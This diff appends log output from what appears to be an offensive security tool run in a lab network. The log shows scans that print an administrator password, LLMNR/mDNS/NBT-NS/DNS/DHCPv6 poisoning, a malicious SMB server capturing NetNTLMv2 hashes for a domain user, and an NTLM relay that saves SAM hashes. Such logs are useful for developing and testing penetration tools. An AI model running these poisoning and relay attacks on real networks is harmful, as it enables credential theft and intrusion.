@@ -1785,3 +1785,318 @@ Exiting ...
 2022-01-15 20:29:15.842 | INFO     | project.utils.scan:__show_user_passwd:212 - [31mUSER -> [39m[34mAdministrator[39m
 2022-01-15 20:29:15.843 | INFO     | project.utils.scan:__show_user_passwd:215 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
 2022-01-15 20:29:15.849 | INFO     | project.utils.scan:__show_specific_subnet_info:228 - [31mSUBNET -> [39m[34m192.168.253.0/24[39m
+2022-01-16 16:56:16.500 | INFO     | project.utils.scan:__show_user_passwd:208 - [31mUSER -> [39m[34mAdministrator[39m
+2022-01-16 16:56:16.502 | INFO     | project.utils.scan:__show_user_passwd:211 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2022-01-16 16:56:16.503 | INFO     | project.utils.scan:__asynchronous_way:440 - Using asynchronous scan.
+2022-01-16 16:56:16.503 | INFO     | project.utils.scan:__asynchronous_way:441 - [32mStarting... The messeges will be displayed as new computer is found[39m
+2022-01-16 16:56:16.520 | INFO     | project.utils.scan:__set_up_scan_actions_asynchronous:418 - Starting to launch threads based on your cpu
+
+2022-01-16 16:57:47.396 | INFO     | project.utils.scan:__show_user_passwd:208 - [31mUSER -> [39m[34mAdministrator[39m
+2022-01-16 16:57:47.396 | INFO     | project.utils.scan:__show_user_passwd:211 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2022-01-16 16:57:47.397 | INFO     | project.utils.scan:__show_specific_subnet_info:224 - [31mSUBNET -> [39m[34m192.168.253.0/24[39m
+2022-01-16 16:58:19.605 | WARNING  | project.utils.scan:__end_scan:581 - Exiting ...
+2022-01-16 16:58:26.353 | WARNING  | project.utils.scan:__end_scan:581 - Exiting ...
+2022-01-16 16:58:35.343 | WARNING  | project.utils.scan:__configure_scan_info:303 - The scan has already been passed with user: Administrator passwd: P@$$w0rd! in 192.168.253.0/24
+2022-01-16 16:58:36.162 | INFO     | project.utils.scan:__show_user_passwd:208 - [31mUSER -> [39m[34mAdministrator[39m
+2022-01-16 16:58:36.163 | INFO     | project.utils.scan:__show_user_passwd:211 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2022-01-16 16:58:36.163 | INFO     | project.utils.scan:__asynchronous_way:440 - Using asynchronous scan.
+2022-01-16 16:58:36.164 | INFO     | project.utils.scan:__asynchronous_way:441 - [32mStarting... The messeges will be displayed as new computer is found[39m
+2022-01-16 16:58:36.171 | INFO     | project.utils.scan:__set_up_scan_actions_asynchronous:418 - Starting to launch threads based on your cpu
+
+2022-01-16 16:58:38.766 | WARNING  | project.utils.scan:__end_scan:581 - Exiting ...
+2022-01-16 16:58:42.767 | WARNING  | project.utils.scan:__configure_scan_info:303 - The scan has already been passed with user: Administrator passwd: P@$$w0rd! in 192.168.253.0/24
+2022-01-16 16:58:46.866 | INFO     | project.utils.scan:__show_user_passwd:208 - [31mUSER -> [39m[34mAdministrator[39m
+2022-01-16 16:58:46.868 | INFO     | project.utils.scan:__show_user_passwd:211 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2022-01-16 16:58:46.868 | INFO     | project.utils.scan:__synchronous_way:550 - Using synchronous scan
+2022-01-16 16:58:46.872 | INFO     | project.utils.scan:__set_up_scan_actions_synchronous:521 - Starting to launch threads based on your cpu
+2022-01-16 16:58:48.893 | WARNING  | project.utils.scan:__set_up_scan_actions_synchronous:540 - 
+Exiting ...
+2022-01-16 16:58:49.280 | SUCCESS  | project.utils.scan:__set_up_scan_actions_synchronous:543 - Synchronous scanning has been completed
+2022-01-16 17:01:08.578 | WARNING  | project.utils.scan:__configure_scan_info:303 - The scan has already been passed with user: Administrator passwd: P@$$w0rd! in 192.168.253.0/24
+2022-01-16 17:01:09.679 | INFO     | project.utils.scan:__show_user_passwd:208 - [31mUSER -> [39m[34mAdministrator[39m
+2022-01-16 17:01:09.680 | INFO     | project.utils.scan:__show_user_passwd:211 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2022-01-16 17:01:09.681 | INFO     | project.utils.scan:__synchronous_way:550 - Using synchronous scan
+2022-01-16 17:01:09.684 | INFO     | project.utils.scan:__set_up_scan_actions_synchronous:521 - Starting to launch threads based on your cpu
+2022-01-16 17:01:21.587 | WARNING  | project.utils.scan:__configure_scan_info:303 - The scan has already been passed with user: Administrator passwd: P@$$w0rd! in 192.168.253.0/24
+2022-01-16 17:02:57.334 | INFO     | project.utils.scan:__show_user_passwd:208 - [31mUSER -> [39m[34mAdministrator[39m
+2022-01-16 17:02:57.335 | INFO     | project.utils.scan:__show_user_passwd:211 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2022-01-16 17:02:57.336 | INFO     | project.utils.scan:__synchronous_way:550 - Using synchronous scan
+2022-01-16 17:02:57.347 | INFO     | project.utils.scan:__set_up_scan_actions_synchronous:521 - Starting to launch threads based on your cpu
+2022-01-16 17:05:13.587 | INFO     | project.utils.scan:__show_user_passwd:207 - [31mUSER -> [39m[34mAdministrator[39m
+2022-01-16 17:05:13.588 | INFO     | project.utils.scan:__show_user_passwd:210 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2022-01-16 17:05:13.588 | INFO     | project.utils.scan:__synchronous_way:561 - Using synchronous scan
+2022-01-16 17:05:13.596 | INFO     | project.utils.scan:__set_up_scan_actions_synchronous:532 - Starting to launch threads based on your cpu
+2022-01-16 17:06:37.956 | SUCCESS  | project.utils.scan:__set_up_scan_actions_synchronous:554 - Synchronous scanning has been completed
+2022-01-16 17:06:51.470 | INFO     | project.utils.scan:__show_user_passwd:207 - [31mUSER -> [39m[34mAdministrator[39m
+2022-01-16 17:06:51.472 | INFO     | project.utils.scan:__show_user_passwd:210 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2022-01-16 17:06:51.478 | INFO     | project.utils.scan:__show_specific_subnet_info:223 - [31mSUBNET -> [39m[34m192.168.253.0/24[39m
+2022-01-16 17:06:59.025 | WARNING  | project.utils.scan:__configure_scan_info:302 - The scan has already been passed with user: Administrator passwd: P@$$w0rd! in 192.168.253.0/24
+2022-01-16 17:06:59.677 | INFO     | project.utils.scan:__show_user_passwd:207 - [31mUSER -> [39m[34mAdministrator[39m
+2022-01-16 17:06:59.678 | INFO     | project.utils.scan:__show_user_passwd:210 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2022-01-16 17:06:59.678 | INFO     | project.utils.scan:__synchronous_way:561 - Using synchronous scan
+2022-01-16 17:06:59.691 | INFO     | project.utils.scan:__set_up_scan_actions_synchronous:532 - Starting to launch threads based on your cpu
+2022-01-16 17:07:04.036 | WARNING  | project.utils.scan:__configure_scan_info:302 - The scan has already been passed with user: Administrator passwd: P@$$w0rd! in 192.168.253.0/24
+2022-01-16 17:07:04.944 | INFO     | project.utils.scan:__show_user_passwd:207 - [31mUSER -> [39m[34mAdministrator[39m
+2022-01-16 17:07:04.944 | INFO     | project.utils.scan:__show_user_passwd:210 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2022-01-16 17:07:04.945 | INFO     | project.utils.scan:__synchronous_way:561 - Using synchronous scan
+2022-01-16 17:07:04.954 | INFO     | project.utils.scan:__set_up_scan_actions_synchronous:532 - Starting to launch threads based on your cpu
+2022-01-16 17:07:31.039 | INFO     | project.utils.scan:__show_user_passwd:207 - [31mUSER -> [39m[34mAdministrator[39m
+2022-01-16 17:07:31.041 | INFO     | project.utils.scan:__show_user_passwd:210 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2022-01-16 17:07:31.042 | INFO     | project.utils.scan:__synchronous_way:561 - Using synchronous scan
+2022-01-16 17:07:31.054 | INFO     | project.utils.scan:__set_up_scan_actions_synchronous:532 - Starting to launch threads based on your cpu
+2022-01-16 17:33:37.713 | INFO     | project.utils.scan:__show_user_passwd:207 - [31mUSER -> [39m[34mAdministrator[39m
+2022-01-16 17:33:37.716 | INFO     | project.utils.scan:__show_user_passwd:210 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2022-01-16 17:33:37.717 | INFO     | project.utils.scan:__synchronous_way:531 - Using synchronous scan
+2022-01-16 17:33:37.731 | INFO     | project.utils.scan:__set_up_scan_actions_synchronous:502 - Starting to launch threads based on your cpu
+2022-01-16 17:34:28.375 | INFO     | project.utils.scan:__show_user_passwd:207 - [31mUSER -> [39m[34mAdministrator[39m
+2022-01-16 17:34:28.376 | INFO     | project.utils.scan:__show_user_passwd:210 - [31mPASSWD -> [39m[34mP@$$w0rd![39m
+2022-01-16 17:34:28.382 | INFO     | project.utils.scan:__show_specific_subnet_info:223 - [31mSUBNET -> [39m[34m192.168.253.0/24[39m
+2022-01-16 17:38:41.426 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:78 - Running mdns poisoning in the background
+2022-01-16 17:38:41.428 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_llmnr:106 - Running llmnr poisoning in the background
+2022-01-16 17:38:41.430 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_nbt_ns:92 - Running nbt_ns poisoning in the background
+2022-01-16 17:38:41.431 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dns:134 - Running dns poisoning in the background
+2022-01-16 17:38:51.698 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:58 - Finishing attack in the background ...
+2022-01-16 17:38:58.434 | INFO     | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:134 - Starting mdns poisoning...
+2022-01-16 17:38:58.444 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:start_llmnr_poisoning:156 - Starting llmnr poisoning...
+2022-01-16 17:38:58.454 | INFO     | project.network.poison.poisonengine.poisoners.nbt_ns:start_nbt_ns_poisoning:135 - Starting nbt-ns poisoning...
+2022-01-16 17:38:58.457 | INFO     | project.network.poison.poisonengine.poisoners.dns:start_dns_poisoning:133 - Starting dns poisoning...
+2022-01-16 17:40:40.638 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:start_llmnr_poisoning:156 - Starting llmnr poisoning...
+2022-01-16 17:40:44.847 | WARNING  | project.network.poison.poisonselector:__checking_conditions_for_attack:82 - The attack is already running in the background
+2022-01-16 17:40:49.126 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:62 - Finishing attack in the background ...
+2022-01-16 17:41:15.090 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:start_llmnr_poisoning:156 - Starting llmnr poisoning...
+2022-01-16 17:41:18.053 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_llmnr:106 - Running llmnr poisoning in the background
+2022-01-16 17:41:33.784 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2022-01-16 17:41:33.789 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-01-16 17:41:33.793 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-01-16 17:41:33.794 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-01-16 17:41:33.795 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-01-16 17:43:33.113 | WARNING  | project.network.mitm.mss:__synchronous_attack:78 - Exiting attack ...
+2022-01-16 17:43:35.976 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:62 - Finishing attack in the background ...
+2022-01-16 17:43:37.989 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:start_llmnr_poisoning:156 - Starting llmnr poisoning...
+2022-01-16 17:43:44.921 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
+2022-01-16 17:43:44.975 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::11cd:3852:b2df:f387[0m
+2022-01-16 17:43:45.015 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.138[0m
+2022-01-16 17:43:53.736 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::11cd:3852:b2df:f387[0m
+2022-01-16 17:43:53.782 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.138[0m
+2022-01-16 17:43:58.331 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::11cd:3852:b2df:f387[0m
+2022-01-16 17:43:58.369 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.138[0m
+2022-01-16 17:44:06.051 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_llmnr:106 - Running llmnr poisoning in the background
+2022-01-16 17:44:09.808 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2022-01-16 17:44:09.812 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-01-16 17:44:09.814 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-01-16 17:44:09.815 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-01-16 17:44:09.816 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-01-16 17:44:37.977 | WARNING  | project.network.mitm.mss:__synchronous_attack:78 - Exiting attack ...
+2022-01-16 17:44:41.311 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-16 17:45:20.742 | WARNING  | project.network.mitm.ntlmrelay:__synchronous_attack:165 - Exiting ntlm relay attack ...
+2022-01-16 17:45:31.200 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:62 - Finishing attack in the background ...
+2022-01-16 17:45:34.703 | INFO     | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:134 - Starting mdns poisoning...
+2022-01-16 17:45:34.707 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:start_llmnr_poisoning:156 - Starting llmnr poisoning...
+2022-01-16 17:45:34.722 | INFO     | project.network.poison.poisonengine.poisoners.nbt_ns:start_nbt_ns_poisoning:135 - Starting nbt-ns poisoning...
+2022-01-16 17:45:41.380 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.1[0m
+2022-01-16 17:45:41.404 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-01-16 17:45:41.417 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::11cd:3852:b2df:f387[0m
+2022-01-16 17:45:41.436 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to fe80::11cd:3852:b2df:f387[0m
+2022-01-16 17:45:41.456 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.138[0m
+2022-01-16 17:45:45.968 | INFO     | project.network.poison.poisonengine.poisoners.nbt_ns:__send_packet:113 - [36m(NBT_NS) Sending packet to 192.168.253.138[0m
+2022-01-16 17:45:50.159 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to fe80::11cd:3852:b2df:f387[0m
+2022-01-16 17:45:50.160 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-01-16 17:45:50.197 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to fe80::11cd:3852:b2df:f387[0m
+2022-01-16 17:45:50.198 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:__send_packet:116 - [36m(LLMNR) Sending packet to 192.168.253.138[0m
+2022-01-16 17:48:06.510 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:78 - Running mdns poisoning in the background
+2022-01-16 17:48:13.971 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2022-01-16 17:48:13.980 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-01-16 17:48:13.995 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-01-16 17:48:13.998 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-01-16 17:48:14.001 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-01-16 17:48:31.473 | WARNING  | project.network.mitm.mss:__synchronous_attack:78 - Exiting attack ...
+2022-01-16 17:49:22.180 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:78 - Running mdns poisoning in the background
+2022-01-16 17:49:53.128 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2022-01-16 17:49:53.145 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-01-16 17:49:53.156 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-01-16 17:49:53.158 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-01-16 17:49:53.159 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-01-16 17:50:11.086 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,57040)
+2022-01-16 17:50:11.134 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\iron,PC-BERU)
+2022-01-16 17:50:11.137 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\iron authenticated successfully
+2022-01-16 17:50:11.146 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - iron::SHADOW:aaaaaaaaaaaaaaaa:d532b4fb8fe7571c2d02a6135bb4a936:0101000000000000808beb81010bd801e7ea4ae60d6d4cc300000000010010006800470050006e0056006d0058007300030010006800470050006e0056006d005800730002001000620068005000550041004f007a00690004001000620068005000550041004f007a00690007000800808beb81010bd801060004000200000008003000300000000000000001000000002000009f75e3669852c466b6566591f39b5472ea2d1d59695edb4c5791f4f7b529bf690a001000000000000000000000000000000000000900280063006900660073002f007000720075006500620061007300730073002e006c006f00630061006c000000000000000000
+2022-01-16 17:50:11.175 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
+2022-01-16 17:50:11.197 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
+2022-01-16 17:50:11.238 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-01-16 17:50:21.827 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
+2022-01-16 17:50:21.837 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.138,57040)
+2022-01-16 17:50:21.840 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
+2022-01-16 17:50:28.161 | WARNING  | project.network.mitm.mss:__synchronous_attack:78 - Exiting attack ...
+2022-01-16 17:51:04.412 | WARNING  | project.network.poison.poisonselector:__checking_conditions_for_attack:81 - The attack is already running in the background
+2022-01-16 17:51:07.352 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:62 - Finishing attack in the background ...
+2022-01-16 17:51:52.245 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2022-01-16 17:51:52.262 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-01-16 17:51:52.270 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-01-16 17:51:52.272 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-01-16 17:51:52.273 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-01-16 17:51:53.088 | WARNING  | project.network.mitm.mss:__synchronous_attack:78 - Exiting attack ...
+2022-01-16 17:51:58.577 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_llmnr:106 - Running llmnr poisoning in the background
+2022-01-16 17:52:24.967 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2022-01-16 17:52:24.985 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-01-16 17:52:24.994 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-01-16 17:52:24.996 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-01-16 17:52:24.997 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-01-16 17:52:35.427 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,57049)
+2022-01-16 17:52:35.467 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\iron,PC-BERU)
+2022-01-16 17:52:35.468 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\iron authenticated successfully
+2022-01-16 17:52:35.473 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - iron::SHADOW:aaaaaaaaaaaaaaaa:97d2cb1da0c750eea25cc95453109c8b:01010000000000008033c0d7010bd801ade1e3e5b138be710000000001001000670061005100730057004a0054004d0003001000670061005100730057004a0054004d000200100053005900710066004b006300470069000400100053005900710066004b00630047006900070008008033c0d7010bd801060004000200000008003000300000000000000001000000002000009f75e3669852c466b6566591f39b5472ea2d1d59695edb4c5791f4f7b529bf690a001000000000000000000000000000000000000900140063006900660073002f00610068006f00720061000000000000000000
+2022-01-16 17:52:35.500 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
+2022-01-16 17:52:35.518 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
+2022-01-16 17:52:35.553 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-01-16 17:52:45.097 | WARNING  | project.network.mitm.mss:__synchronous_attack:78 - Exiting attack ...
+2022-01-16 17:57:48.834 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_llmnr:106 - Running llmnr poisoning in the background
+2022-01-16 17:57:50.189 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2022-01-16 17:57:50.193 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-01-16 17:57:50.197 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-01-16 17:57:50.197 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-01-16 17:57:50.198 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-01-16 17:57:56.676 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,57160)
+2022-01-16 17:57:56.703 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\iron,PC-BERU)
+2022-01-16 17:57:56.703 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\iron authenticated successfully
+2022-01-16 17:57:56.705 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - iron::SHADOW:aaaaaaaaaaaaaaaa:cda5eacb56aa28fdbe1e2a84fb86f0bf:010100000000000000ea1497020bd8010c4f476f36ff3f8700000000010010006a006b0071006a007a00790075006700030010006a006b0071006a007a0079007500670002001000770073005800500054006a007400610004001000770073005800500054006a00740061000700080000ea1497020bd801060004000200000008003000300000000000000001000000002000009f75e3669852c466b6566591f39b5472ea2d1d59695edb4c5791f4f7b529bf690a001000000000000000000000000000000000000900140063006900660073002f00610068006f00720061000000000000000000
+2022-01-16 17:57:56.731 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-01-16 17:58:01.383 | WARNING  | project.network.mitm.mss:__synchronous_attack:78 - Exiting attack ...
+2022-01-16 18:07:58.270 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_llmnr:106 - Running llmnr poisoning in the background
+2022-01-16 18:08:00.249 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-16 18:08:21.428 | WARNING  | project.network.mitm.ntlmrelay:__synchronous_attack:165 - Exiting ntlm relay attack ...
+2022-01-16 18:10:45.843 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_llmnr:106 - Running llmnr poisoning in the background
+2022-01-16 18:10:48.548 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-16 18:10:50.164 | WARNING  | project.network.mitm.ntlmrelay:__synchronous_attack:165 - Exiting ntlm relay attack ...
+2022-01-16 18:10:59.377 | INFO     | project.network.mitm.ntlmrelay:__wrapper_attack:306 - Running ntlm relay in the background the results will be saved at: /home/rsgbengi/Igris/loot/192.168.253.138_samhashes.sam 
+2022-01-16 18:10:59.406 | INFO     | project.network.mitm.servers.smbserver:start_smb_relay_server:127 - Setting up SMB Server
+2022-01-16 18:10:59.420 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-16 18:11:06.874 | SUCCESS  | project.network.mitm.ntlmrelay:__ends_ntlm_relay:328 - Finishing ntlm relay attack in the background ...
+2022-01-16 18:13:30.008 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_llmnr:106 - Running llmnr poisoning in the background
+2022-01-16 18:13:36.783 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:70 - Finishing attack in the background ...
+2022-01-16 18:16:21.063 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_llmnr:106 - Running llmnr poisoning in the background
+2022-01-16 18:16:49.618 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dhcp6:120 - Running dhcp6 poisoning in the background
+2022-01-16 18:17:14.962 | SUCCESS  | project.network.poison.dnstakeover:__end_process_in_the_background:50 - Finishing attack in the background ...
+2022-01-16 18:20:38.905 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_llmnr:106 - Running llmnr poisoning in the background
+2022-01-16 18:20:53.451 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:70 - Finishing attack in the background ...
+2022-01-16 18:20:59.615 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:78 - Running mdns poisoning in the background
+2022-01-16 18:21:02.769 | WARNING  | project.network.poison.poisonselector:__checking_conditions_for_attack:92 - The attack is already running in the background
+2022-01-16 18:21:04.652 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:70 - Finishing attack in the background ...
+2022-01-16 18:21:11.027 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:78 - Running mdns poisoning in the background
+2022-01-16 18:21:11.030 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_llmnr:106 - Running llmnr poisoning in the background
+2022-01-16 18:21:11.036 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_nbt_ns:92 - Running nbt_ns poisoning in the background
+2022-01-16 18:21:16.205 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:70 - Finishing attack in the background ...
+2022-01-16 18:21:47.121 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:78 - Running mdns poisoning in the background
+2022-01-16 18:21:51.953 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:71 - Finishing attack in the background ...
+2022-01-16 18:23:21.499 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:78 - Running mdns poisoning in the background
+2022-01-16 18:24:09.270 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:78 - Running mdns poisoning in the background
+2022-01-16 18:26:11.946 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_llmnr:106 - Running llmnr poisoning in the background
+2022-01-16 18:27:20.459 | WARNING  | project.network.poison.poisonselector:__checking_conditions_for_attack:92 - The attack is already running in the background
+2022-01-16 18:27:28.888 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:78 - Running mdns poisoning in the background
+2022-01-16 18:27:37.300 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:70 - Finishing attack in the background ...
